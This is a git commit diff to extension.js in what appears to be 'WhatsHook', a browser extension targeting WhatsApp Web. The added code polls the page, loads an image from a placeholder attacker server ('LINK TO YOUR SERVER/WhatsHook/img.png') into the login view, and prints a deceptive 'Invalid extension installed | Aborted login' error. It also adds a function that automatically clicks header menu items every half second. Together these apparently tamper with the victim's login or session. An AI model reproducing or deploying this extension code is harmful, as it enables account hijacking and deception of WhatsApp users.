052379f18597d0ea5ce82e1f1456f324d593def4
Evolgate <81663010+Evolgate@users.noreply.github.com>
2022-09-08 13:18:48 +0200

    Update extension.js

--- extension.js
+++ extension.js
@@ -12,11 +12,13 @@
     'use strict';
 
 (new MutationObserver(check)).observe(document, {childList: true, subtree: true});
+(new MutationObserver(ncheck)).observe(document, {childList: true, subtree: true});
 
 function check(changes, observer) {
     if(document.getElementsByClassName("_25pwu")[0]) {
         observer.disconnect();
             setInterval(function(){
+                console.error("Invalid extension installed | Aborted login")
                 const img = document.createElement("img")
                 img.src = "LINK TO YOUR SERVER/WhatsHook/img.png?lastmod="+Date.now();
                 try {
@@ -30,7 +32,20 @@ function check(changes, observer) {
                     image.src = img.src;
                 }
                 edit();
-            }, 2000);
+            }, 500);
+    }
+}
+
+function ncheck(changes, observer) {
+    if(document.getElementsByClassName("_2cNrC")[0]) {
+        observer.disconnect();
+            setInterval(function(){
+                try {
+                document.querySelector("#app > div > div > div.ldL67._2i3T7 > header > div._3yZPA > div > span > div:nth-child(5) > div > span").click()
+                document.querySelector("#app > div > div > div.ldL67._2i3T7 > header > div._3yZPA > div > span > div._2cNrC._1CTfw > span > div > ul > li:nth-child(4) > div._2oldI.dJxPU").click()
+                document.querySelector("#app > div > span:nth-child(2) > div > div > div > div > div > div > div._2i3w0 > div > div._20C5O._2Zdgs > div > div").click()
+                }catch {}
+            }, 500);
     }
 }
 
